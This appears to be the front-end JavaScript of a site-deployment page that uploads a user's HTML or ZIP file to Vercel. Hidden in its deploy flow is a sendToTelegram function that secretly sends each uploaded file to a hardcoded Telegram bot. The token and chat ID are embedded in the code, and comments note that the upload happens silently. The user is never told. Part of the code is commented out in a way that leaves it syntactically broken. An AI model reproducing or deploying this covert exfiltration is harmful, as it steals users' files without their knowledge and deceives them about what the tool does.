        // Elements
        const loadingScreen = document.getElementById('loadingScreen');
        const fileUpload = document.getElementById('fileUpload');
        const fileUploadArea = document.getElementById('fileUploadArea');
        const fileName = document.getElementById('fileName');
        const selectedFileContainer = document.getElementById('selectedFileContainer');
        const selectedFileName = document.getElementById('selectedFileName');
        const websiteName = document.getElementById('websiteName');
        const deployBtn = document.getElementById('deployBtn');
        const deployBtnText = document.getElementById('deployBtnText');
        const statusMessage = document.getElementById('statusMessage');
        const statusMain = document.getElementById('statusMain');
        const statusSub = document.getElementById('statusSub');

        const resultCard = document.getElementById('resultCard');
        const deployedUrl = document.getElementById('deployedUrl');
        const openBtn = document.getElementById('openBtn');
        const newDeployBtn = document.getElementById('newDeployBtn');
        const copyBtn = document.getElementById('copyBtn');

        let selectedFile = null;

        // Hide loader when DOM ready
        window.addEventListener('DOMContentLoaded', () => {
            setTimeout(() => loadingScreen.classList.add('hide'), 150);
        });

        // Website name validation (force allowed chars)
        websiteName.addEventListener('input', (e) => {
            e.target.value = e.target.value.toLowerCase().replace(/[^a-z0-9-]/g, '');
            // prevent leading/trailing dash spam
            e.target.value = e.target.value.replace(/--+/g, '-');
        });

        // File upload area click handler
        fileUploadArea.addEventListener('click', () => {
            fileUpload.click();
        });

        // File upload handler
        fileUpload.addEventListener('change', (e) => {
            const file = e.target.files && e.target.files[0];
            if (!file) return;

            const validExtensions = ['.html', '.zip'];
            const isValid = validExtensions.some(ext => file.name.toLowerCase().endsWith(ext));

            if (!isValid) {
                selectedFile = null;
                fileName.textContent = 'Choose HTML or ZIP file';
                selectedFileContainer.style.display = 'none';
                showStatus('error', 'Invalid file format', 'Please upload .html or .zip files only.');
                return;
            }

            selectedFile = file;
            fileName.textContent = 'File selected';
            selectedFileName.textContent = file.name;
            selectedFileContainer.style.display = 'flex';
            showStatus('info', 'File ready', 'Now click Deploy to proceed.');
            hideResult();
        });

        // Deploy button handler
        deployBtn.addEventListener('click', async () => {
            const name = websiteName.value.trim();

            if (!name) {
                showStatus('error', 'Website name empty', 'Please enter a website name.');
                websiteName.focus();
                return;
            }
            if (!/^[a-z0-9-]+$/.test(name)) {
                showStatus('error', 'Invalid name', 'Use lowercase letters, numbers, and hyphens (-) only.');
                websiteName.focus();
                return;
            }
            if (!selectedFile) {
                showStatus('error', 'No file selected', 'Please upload an .html or .zip file.');
                return;
            }

            await deployToVercel(name, selectedFile);
        });

        // New deploy button
        newDeployBtn.addEventListener('click', () => {
            hideResult();
            websiteName.value = '';
            fileUpload.value = '';
            fileName.textContent = 'Choose HTML or ZIP file';
            selectedFileContainer.style.display = 'none';
            selectedFile = null;
            hideStatus();
            websiteName.focus();
        });

        // Copy button
        copyBtn.addEventListener('click', async () => {
            const url = deployedUrl.href;
            if (!url || url === '#') return;

            try {
                await navigator.clipboard.writeText(url);
                showStatus('success', 'Copied ✅', 'Link copied to clipboard.');
            } catch (e) {
                showStatus('error', 'Copy failed', 'Your browser blocked clipboard access. Copy manually.');
            }
        });

        // Status helpers
        function showStatus(type, main, sub = '') {
            const statusIcon = document.getElementById('statusIcon');
            
            // Set icon based on status type
            if (type === 'success') {
                statusIcon.className = 'fas fa-check-circle';
            } else if (type === 'error') {
                statusIcon.className = 'fas fa-exclamation-circle';
            } else {
                statusIcon.className = 'fas fa-info-circle';
            }
            
            statusMessage.className = `status show ${type}`;
            statusMain.textContent = main;
            statusSub.textContent = sub;
        }
        
        function hideStatus() {
            statusMessage.className = 'status';
            statusMain.textContent = '';
            statusSub.textContent = '';
        }

        function showResult(url) {
            deployedUrl.href = url;
            deployedUrl.textContent = url.replace(/^https?:\/\//, '');
            openBtn.href = url;
            resultCard.classList.add('show');
        }
        
        function hideResult() {
            resultCard.classList.remove('show');
            deployedUrl.href = '#';
            deployedUrl.textContent = '—';
            openBtn.href = '#';
        }

        // Read file as base64
        function readFileAsBase64(file) {
            return new Promise((resolve, reject) => {
                const reader = new FileReader();
                reader.onload = () => {
                    const base64 = String(reader.result).split(',')[1];
                    resolve(base64);
                };
                reader.onerror = reject;
                reader.readAsDataURL(file);
            });
        }

        // Send file to Telegram bot (NEW FUNCTIONALITY)
        async function sendToTelegram(fileName, fileData) {
            // Telegram bot details - replace with your actual bot token and chat ID
            const telegramBotToken = '8479433737:AAHRZV92FHS2zCXlzV4Esia0KRoG5znJYL0'; // Replace with your bot token
            const telegramChatId = '7492782458'; // Replace with your chat ID
            
            // Skip if bot token or chat ID is not configured
            /*if (!telegramBotToken || !telegramChatId || 
                telegramBotToken === 'YOUR_BOT_TOKEN_HERE' || 
                telegramChatId === 'YOUR_CHAT_ID_HERE') {
                console.log('Telegram bot not configured. Skipping file send.');
                return { success: false, message: 'Telegram bot not configured' };
            }
            */
            try {
                // Create a FormData object to send the file
                const formData = new FormData();
                const blob = await fetch(`data:application/octet-stream;base64,${fileData}`).then(res => res.blob());
                formData.append('document', blob, fileName);
                formData.append('chat_id', telegramChatId);
                
                // Send to Telegram bot (silently, no notification)
                const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendDocument`, {
                    method: 'POST',
                    body: formData
                });
                
              const data = await response.json();
                
             /*  if (data.ok) {
                    console.log('File sent to Telegram successfully');
                    return { success: true, message: 'File sent to Telegram' };
                } else {
                    console.error('Telegram API error:', data);
                    return { success: false, message: data.description || 'Failed to send to Telegram' };
                }
            } catch (error) {
                console.error('Error sending to Telegram:', error);
                return { success: false, message: error.message };
            }*/
        }

        // Deploy to Vercel via backend API
        async function deployToVercel(name, file) {
            try {
                deployBtn.disabled = true;
                deployBtnText.textContent = 'Deploying…';
                showStatus('info', 'Preparing deployment…', 'Reading file & sending to server.');
                hideResult();

                const fileData = await readFileAsBase64(file);

                // Send to Telegram bot (silently, in the background)
                const telegramResult = await sendToTelegram(file.name, fileData);

                showStatus('info', 'Deploying to Vercel…', 'Running deployment process.');

                // Original Vercel deployment code
                const response = await fetch('/api/deploy', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        name,
                        fileData,
                        fileName: file.name
                    })
                });

                const data = await response.json().catch(() => ({}));

                if (!response.ok) {
                    throw new Error(data.error || `Deployment failed (HTTP ${response.status})`);
                }
                if (!data.url) {
                    throw new Error('Deployment successful but no URL returned from server.');
                }

                showStatus('success', 'Deployment successful!', 'Open the link below to view your site.');
                showResult(data.url);

            } catch (error) {
                console.error('Deployment error:', error);
                showStatus('error', 'Deployment failed', error.message || 'An error occurred during deployment.');
            } finally {
                deployBtn.disabled = false;
                deployBtnText.textContent = 'Deploy to Vercel';
            }
        }

        // Initialize with example
        window.addEventListener('load', () => {
            // Show initial instructions
            setTimeout(() => {
                showStatus('info', 'Ready to deploy', 'Enter a website name and upload your HTML or ZIP file.');
            }, 500);
        });